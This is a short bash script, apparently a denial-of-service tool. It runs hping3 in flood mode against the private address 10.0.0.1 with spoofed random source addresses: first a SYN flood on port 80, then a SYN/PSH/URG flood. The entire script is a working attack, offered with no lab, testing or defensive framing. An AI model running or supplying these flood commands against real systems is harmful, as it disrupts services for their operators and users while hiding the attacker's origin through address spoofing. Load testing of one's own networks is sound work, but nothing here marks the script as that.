#!/bin/bash

hping3 --flood -p 80 -S --rand-source 10.0.0.1
hping3 -S -P -U --flood -V --rand-source 10.0.0.1
